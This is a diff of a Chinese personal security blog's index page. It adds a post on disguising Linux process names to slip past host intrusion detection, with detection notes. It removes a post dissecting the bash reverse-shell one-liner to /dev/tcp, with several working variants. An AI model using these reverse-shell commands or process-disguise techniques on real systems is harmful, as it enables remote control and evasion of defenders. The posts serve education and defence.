@@ -125,7 +125,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-count">59</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -159,6 +159,155 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0/" class="post-title-link" itemprop="url">如何改变进程名称</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pFpGujKnXMhOh5ef3Z9H2g">测试反弹shell</a>时，测试发现：某厂商会根判断程命令是否是bash、sh等脚本解释器，如果修改bash、sh等文件名后反弹shell，就会绕过厂商的反弹shell防护。</p>
+<blockquote>
+<p>需要注意的的是：”修改敏感文件名、复制敏感文件“本身非常有可能被hids当作一种”异常文件操作”行为。</p>
+</blockquote>
+<p>还有一些场景下也会涉及到”进程名称的修改”：比如某些恶意软件会修改进程名称，伪装成”内核线程”。</p>
+<p>所以可以说，在”进程名称的修改”这个点上是存在一些攻防对抗的。</p>
+<p>本文研究：</p>
+<ul>
+<li>除了直接修改程序文件名，还有哪些方式来修改进程名称？</li>
+<li>作为防守方，怎么发现和检测这些”修改方式”？</li>
+</ul>
+<p>本文应该适合 做应急响应、hids和”对linux后渗透感兴趣”的读者阅读，文章中给出了我对每种隐藏方式的效果验证，方便读者对隐藏效果做评估。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>怎么查看”进程名称”？</p>
+<p>在 /proc/{pid} 目录下有好几个文件都存放有”进程名称”相关的信息，如下图：<br><img src="https://user-images.githubusercontent.com/1846319/131244474-9dbb39c7-ba13-4033-a213-809a7773e443.png" alt="image"></p>
+<p>更常见的情况下，我们是通过ps、top等命令来查看进程信息。</p>
+<p>ps命令也是基于 /proc/{pid}/stat、/proc/{pid}/status、/proc/{pid}/cmdline 等文件来获取进程信息。可以通过strace命令查看系统调用验证一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# strace ps aux 2&gt;&amp;1 |grep proc |grep 29224</span><br><span class="line">stat(&quot;&#x2F;proc&#x2F;29224&quot;, &#123;st_mode&#x3D;S_IFDIR|0555, st_size&#x3D;0, ...&#125;) &#x3D; 0</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;stat&quot;, O_RDONLY)      &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;status&quot;, O_RDONLY)    &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;cmdline&quot;, O_RDONLY)   &#x3D; 6</span><br><span class="line">readlink(&quot;&#x2F;proc&#x2F;29224&#x2F;fd&#x2F;2&quot;, &quot;&#x2F;42&quot;, 127) &#x3D; 3</span><br><span class="line">[root@instance-fj5pftdp ~]#</span><br><span class="line">[root@instance-fj5pftdp ~]# strace ps -A 2&gt;&amp;1 |grep proc |grep 29224</span><br><span class="line">stat(&quot;&#x2F;proc&#x2F;29224&quot;, &#123;st_mode&#x3D;S_IFDIR|0555, st_size&#x3D;0, ...&#125;) &#x3D; 0</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;stat&quot;, O_RDONLY)      &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;status&quot;, O_RDONLY)    &#x3D; 6</span><br><span class="line">readlink(&quot;&#x2F;proc&#x2F;29224&#x2F;fd&#x2F;2&quot;, &quot;&#x2F;42&quot;, 127) &#x3D; 3</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么修改”进程名称”？</p>
+<p>改变进程名包括以下方式：</p>
+<ul>
+<li>execve系统调用</li>
+<li>prctl系统调用</li>
+<li>修改进程argv</li>
+<li>软链接</li>
+</ul>
+</li>
+</ul>
+<h1 id="通过”execve系统调用”改变进程名称"><a href="#通过”execve系统调用”改变进程名称" class="headerlink" title="通过”execve系统调用”改变进程名称"></a>通过”execve系统调用”改变进程名称</h1><ul>
+<li><p>怎么通过”execve系统调用”可以改变进程名称？</p>
+<p>execve系统调用的第二个参数可以指定cmdline，如下：</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131255950-11235b12-c64c-4572-8a0d-521a299b3ee6.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">     char * execve_str[] &#x3D; &#123;&quot;test_sleep&quot;,&quot;10000&quot;&#125;;   &#x2F;&#x2F; 第一个参数会出现在&#x2F;pro&#x2F;&#123;pid&#125;&#x2F;cmdline</span><br><span class="line">     char * env[] &#x3D; &#123;NULL&#125;;</span><br><span class="line">     if (execve(&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;,execve_str,env) &lt;0 )&#123;</span><br><span class="line">         perror(&quot;error on exec&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更简便的方式是：通过bash的exec命令的<code>-a</code>参数改变进程名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec -a &quot;xxx&quot; sleep 10000</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>效果</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131254028-441d0792-68b5-4eab-b2a2-6208fe6f2c70.png" alt="image"></p>
+<p>可以看到：<code>ps -A</code>可以看到sleep文件名信息，<code>ps aux</code>无法看到。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131253952-c2ea6b18-614f-4145-b7a5-c05b97235a29.png" alt="image"></p>
+<p>可以看到：只有cmdline被修改了。</p>
+</li>
+</ul>
+<h1 id="通过”prctl系统调用”改变进程名称"><a href="#通过”prctl系统调用”改变进程名称" class="headerlink" title="通过”prctl系统调用”改变进程名称"></a>通过”prctl系统调用”改变进程名称</h1><ul>
+<li><p>怎么通过”prctl系统调用”改变进程名称？</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/250654.html">Linux进程隐藏：初级篇</a> 这篇文章有demo代码</p>
+</li>
+<li><p>效果<br><img src="https://user-images.githubusercontent.com/1846319/131256636-e9edd238-3856-4f90-a126-30570e44a472.png" alt="image"></p>
+<p>可以看到虽然stat、comm、status文件已经修改，但是cmdline、exe等文件仍然有原程序名信息。</p>
+</li>
+<li><p>怎么检测？</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/blob/main/driver/README-zh_CN.md">字节hids</a> hook了这个系统调用</p>
+</li>
+</ul>
+<h1 id="通过”修改进程argv-0-”隐藏进程名称"><a href="#通过”修改进程argv-0-”隐藏进程名称" class="headerlink" title="通过”修改进程argv[0]”隐藏进程名称"></a>通过”修改进程argv[0]”隐藏进程名称</h1><ul>
+<li><p>怎么通过”修改进程argv[0]”隐藏进程名称？</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/250654.html">Linux进程隐藏：初级篇</a> 这篇文章有demo代码</p>
+</li>
+<li><p>谁用了这种方式？</p>
+<p>恶意软件<a target="_blank" rel="noopener" href="https://github.com/n1nj4sec/pupy/blob/unstable/pupy/packages/linux/all/hide_process.py">puppy</a> 就用到了这种方式修改进程名为”[kworker/2:0]”。</p>
+<blockquote>
+<p>“[XXXX]”这种进程名都是内核线程</p>
+</blockquote>
+<p><img src="https://user-images.githubusercontent.com/1846319/131245230-c8f97321-5d04-41f9-a347-f7a4f69e3794.png" alt="image"></p>
+</li>
+<li><p>效果</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131253587-ec40a6c2-2b19-4df1-90d3-68a6772be975.png" alt="image"></p>
+<p>可以看到：只有cmdline被修改了。</p>
+</li>
+</ul>
+<h1 id="通过”软链接”改变进程名称"><a href="#通过”软链接”改变进程名称" class="headerlink" title="通过”软链接”改变进程名称"></a>通过”软链接”改变进程名称</h1><ul>
+<li><p>是什么？</p>
+<p>在 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1609832">两个主题：躲避execve与分析/proc/目录</a> 这篇文章提到了：利用”软链接”可以改变进程信息，并且文件哈希和源文件不一致，这样可以用来躲避安全产品的监控。</p>
+</li>
+<li><p>效果<br><img src="https://user-images.githubusercontent.com/1846319/131256254-29bd80e0-8475-47f2-a13f-c6d4bfcc3b39.png" alt="image"></p>
+<p>可以看到：只有exe文件还有原程序信息，所以这种方式隐藏进程名的效果是最好的。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>可以有以下结论：</p>
+<ul>
+<li>单看四种隐藏方式，”软链接”这种方式隐蔽得最好；其他几种方式，comm、stat、cmdline、status文件中总会有原程序相关信息</li>
+<li>不论哪种方式，exe文件仍然有原程序相关信息</li>
+<li>像”prctl系统调用”这种方式应该避免使用</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1110,7 +1259,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E7%88%AC%E6%A3%80%E6%B5%8B%E5%B0%8F%E7%BB%93(%E4%B8%80)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1123,7 +1272,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
+          <a href="/2021-12-26-%E5%8F%8D%E7%88%AC%E6%A3%80%E6%B5%8B%E5%B0%8F%E7%BB%93(%E4%B8%80)/" class="post-title-link" itemprop="url">反爬检测小结(一)</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1147,63 +1296,59 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
-<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>-i 参数</p>
-<p>  生成交互式shell</p>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前对”反爬反bot”做过一些调研工作：从网上搜索资料、研究分析厂商的产品。</p>
+<p>如果你也准备做”反爬”相关的工作，希望我的小结能够加速你的进度。</p>
+<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><ul>
+<li><p>是什么？</p>
+<p>在做”反爬”之前，我想有必要对我们的目标”爬虫”有一些了解。下面的分类有些只是我个人的分法，相信”老反爬工程师”有更细致的分类。</p>
+<p>按照产品形态上，爬虫可以分为：</p>
+<blockquote>
+<p>h5爬虫（包括pc端爬虫）：主要爬取网页上的信息，比如淘宝首页的商品信息等</p>
+<p>app爬虫：主要爬取手机app上的信息；有一些基于<a target="_blank" rel="noopener" href="https://developer.android.com/studio/test/monkeyrunner">monkeyrunner</a>实现</p>
+</blockquote>
+<p>提供”反爬服务”的厂商也是根据h5和app提供了不同的解决方案。</p>
+<p>按照好坏，爬虫也可以分为：</p>
+<blockquote>
+<p>合法爬虫：百度、谷歌等爬虫就不能被”反爬产品”拦截，否则会影响客户站点的SEO</p>
+<p>恶意爬虫: 我们要防的</p>
+</blockquote>
+<p>按照爬虫的目的，可以粗略分为：</p>
+<blockquote>
+<p>扫描器爬虫：主要爬取api接口、文件资源等信息，作为”漏洞扫描器”的输入。比如 <a target="_blank" rel="noopener" href="https://github.com/Qianlitp/crawlergo">crawlergo</a></p>
+<p>数据爬虫：主要以爬取数据为目的，可能大部分爬虫都可以归属到这类。</p>
+</blockquote>
+<p>扫描器爬虫有一个特点是，它会做的很”通用”：我比较难想象攻击者会为了测试每一个站点，单独写一个特定的爬虫。因为”通用”，所以这种爬虫我觉得是属于比较好发现和防御的。</p>
+<p>相对来说，数据爬虫就会很”专用”：”爬虫工程师”有足够的耐心去盯着一个目标，和”反爬系统”做对抗。所以这里的对抗程度”最为激烈”（人和人的对抗）。</p>
+<p>因为我只研究了h5爬虫，所以我下面都是围绕h5爬虫的场景来描述。</p>
 </li>
-<li><p><code>&gt;&amp;</code> 是什么？</p>
-<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
-<ul>
-<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
+<li><p>怎么实现h5爬虫？</p>
+<p>想要”反爬”，我们先要知道爬虫是怎么做的。</p>
+<p>从<a target="_blank" rel="noopener" href="https://pitechan.com/%E7%88%AC%E8%99%AB%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E4%B9%8B%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/">网络上</a>找了一个架构图</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/146482122-ac152bed-390e-4e02-ab72-51f5ad437af4.png" alt="爬虫架构"></p>
+<p>这里可以看到架构中包含”代理ip”、”浏览器操作”、”验证码识别”等功能，这些功能也是”反爬系统”重点关注的场景。</p>
+<p>另外根据网上资料总结，爬虫”请求网站数据”有三种比较流行的实现方式：</p>
+<blockquote>
+<p>纯脚本：很多网络上的教程会教你用python语言，beautifulsoup、evaljs等库去实现一个网页爬虫；或者基于scrapy框架来实现</p>
+<p>调用”浏览器”：使用puppeteer、selenium等</p>
+<p>浏览器插件</p>
+</blockquote>
+<p>了解爬虫是怎么实现后，我们就可以来看看怎么”反恶意爬虫”。</p>
 </li>
-<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
-<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
-<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
+<li><p>怎么”反恶意爬虫”？</p>
+<p>我们可以通过下面的方式识别”反恶意爬虫”：</p>
+<blockquote>
+<p>通过”可信前端”来识别爬虫：在”爬虫”调用”浏览器”来”请求网站数据”时，我们通过一些”手段”能够知道浏览器是爬虫在使用，而不是正常用户使用</p>
+<p>人机识别： 爬虫、扫描器、机器人等行为都可以通过”人机识别”来区分</p>
+<p>威胁情报：比如威胁情报能够告诉我们某个ip是否是代理ip，而从上面的架构图来看，”爬虫”是会有”代理ip”模块的</p>
+<p>数据风控：反爬本身就是业务安全，感觉和”风控反欺诈”用到的手段很相似。我没有做过风控，之前在微信读书看过《风控要略:互联网业务反欺诈之路》，感觉写得比较实在，推荐给你。</p>
+</blockquote>
+<p>我们识别”恶意爬虫”最终也是为了保护数据，而”保护数据”并不一定是需要识别”恶意爬虫”。比如 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37838586">字体反爬</a></p>
+<p>甚至可以做一些”反制”，比如<a target="_blank" rel="noopener" href="https://www.cnblogs.com/index-html/p/frontend-based-war.html">对抗假人 —— 前后端结合的 WAF</a>提到通过”脱壳迷惑”、”蜜罐钓鱼”等来消耗”爬虫工程师”的时间资源，再比如爬虫数据最终都要存储，或许可以制造垃圾数据或者带sql注入payload的数据。</p>
 </li>
 </ul>
-</li>
-<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
-<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
-<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
-<p>  更详细的可以看参考资料</p>
-</li>
-<li><p><code>0&gt;&amp;1</code> 是什么？</p>
-<p>  将标准输入重定向到标准输出</p>
-</li>
-<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
-<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
-</li>
-</ul>
-<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
-<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
-<li><p>验证<code>&gt;&amp;</code>语法</p>
-<p> <code>&amp;&gt;</code>是一种特殊情况</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
-<li><p>验证 文件描述符指向 socket</p>
-<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
-
-<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
-<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
-<p> 比如下面命令反弹shell会有些问题</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p> 而下面命令可以反弹shell</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
-<ul>
-<li>“&gt;&amp;”的两种用法</li>
-<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
-</ul>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
-</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文粗略地对”爬虫”和”反爬”手段做了一些分类。后面文章我会讲述”反爬”手段的一些细节和案例。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/146490073-049890c8-b45d-42d4-a337-00ac10251822.png" alt="数据流"></p>
+<p>另外我在调研中觉得有些资料还不错，放到了<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/5aad51fff569308748370dcf1609bc1c">gist</a>，你也可以看看。</p>
 
       
     </div>
@@ -1314,122 +1459,6 @@
 </ul>
 <p>测试结果在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithObfuscator/tree/main/tests">tests目录</a> 看到</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a314131070/article/details/106567825?spm=1001.2014.3001.5501">JS反混淆-控制流平展（一）</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E7%88%AC%E6%A3%80%E6%B5%8B%E5%B0%8F%E7%BB%93(%E4%B8%80)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%8F%8D%E7%88%AC%E6%A3%80%E6%B5%8B%E5%B0%8F%E7%BB%93(%E4%B8%80)/" class="post-title-link" itemprop="url">反爬检测小结(一)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前对”反爬反bot”做过一些调研工作：从网上搜索资料、研究分析厂商的产品。</p>
-<p>如果你也准备做”反爬”相关的工作，希望我的小结能够加速你的进度。</p>
-<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><ul>
-<li><p>是什么？</p>
-<p>在做”反爬”之前，我想有必要对我们的目标”爬虫”有一些了解。下面的分类有些只是我个人的分法，相信”老反爬工程师”有更细致的分类。</p>
-<p>按照产品形态上，爬虫可以分为：</p>
-<blockquote>
-<p>h5爬虫（包括pc端爬虫）：主要爬取网页上的信息，比如淘宝首页的商品信息等</p>
-<p>app爬虫：主要爬取手机app上的信息；有一些基于<a target="_blank" rel="noopener" href="https://developer.android.com/studio/test/monkeyrunner">monkeyrunner</a>实现</p>
-</blockquote>
-<p>提供”反爬服务”的厂商也是根据h5和app提供了不同的解决方案。</p>
-<p>按照好坏，爬虫也可以分为：</p>
-<blockquote>
-<p>合法爬虫：百度、谷歌等爬虫就不能被”反爬产品”拦截，否则会影响客户站点的SEO</p>
-<p>恶意爬虫: 我们要防的</p>
-</blockquote>
-<p>按照爬虫的目的，可以粗略分为：</p>
-<blockquote>
-<p>扫描器爬虫：主要爬取api接口、文件资源等信息，作为”漏洞扫描器”的输入。比如 <a target="_blank" rel="noopener" href="https://github.com/Qianlitp/crawlergo">crawlergo</a></p>
-<p>数据爬虫：主要以爬取数据为目的，可能大部分爬虫都可以归属到这类。</p>
-</blockquote>
-<p>扫描器爬虫有一个特点是，它会做的很”通用”：我比较难想象攻击者会为了测试每一个站点，单独写一个特定的爬虫。因为”通用”，所以这种爬虫我觉得是属于比较好发现和防御的。</p>
-<p>相对来说，数据爬虫就会很”专用”：”爬虫工程师”有足够的耐心去盯着一个目标，和”反爬系统”做对抗。所以这里的对抗程度”最为激烈”（人和人的对抗）。</p>
-<p>因为我只研究了h5爬虫，所以我下面都是围绕h5爬虫的场景来描述。</p>
-</li>
-<li><p>怎么实现h5爬虫？</p>
-<p>想要”反爬”，我们先要知道爬虫是怎么做的。</p>
-<p>从<a target="_blank" rel="noopener" href="https://pitechan.com/%E7%88%AC%E8%99%AB%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E4%B9%8B%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/">网络上</a>找了一个架构图</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/146482122-ac152bed-390e-4e02-ab72-51f5ad437af4.png" alt="爬虫架构"></p>
-<p>这里可以看到架构中包含”代理ip”、”浏览器操作”、”验证码识别”等功能，这些功能也是”反爬系统”重点关注的场景。</p>
-<p>另外根据网上资料总结，爬虫”请求网站数据”有三种比较流行的实现方式：</p>
-<blockquote>
-<p>纯脚本：很多网络上的教程会教你用python语言，beautifulsoup、evaljs等库去实现一个网页爬虫；或者基于scrapy框架来实现</p>
-<p>调用”浏览器”：使用puppeteer、selenium等</p>
-<p>浏览器插件</p>
-</blockquote>
-<p>了解爬虫是怎么实现后，我们就可以来看看怎么”反恶意爬虫”。</p>
-</li>
-<li><p>怎么”反恶意爬虫”？</p>
-<p>我们可以通过下面的方式识别”反恶意爬虫”：</p>
-<blockquote>
-<p>通过”可信前端”来识别爬虫：在”爬虫”调用”浏览器”来”请求网站数据”时，我们通过一些”手段”能够知道浏览器是爬虫在使用，而不是正常用户使用</p>
-<p>人机识别： 爬虫、扫描器、机器人等行为都可以通过”人机识别”来区分</p>
-<p>威胁情报：比如威胁情报能够告诉我们某个ip是否是代理ip，而从上面的架构图来看，”爬虫”是会有”代理ip”模块的</p>
-<p>数据风控：反爬本身就是业务安全，感觉和”风控反欺诈”用到的手段很相似。我没有做过风控，之前在微信读书看过《风控要略:互联网业务反欺诈之路》，感觉写得比较实在，推荐给你。</p>
-</blockquote>
-<p>我们识别”恶意爬虫”最终也是为了保护数据，而”保护数据”并不一定是需要识别”恶意爬虫”。比如 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37838586">字体反爬</a></p>
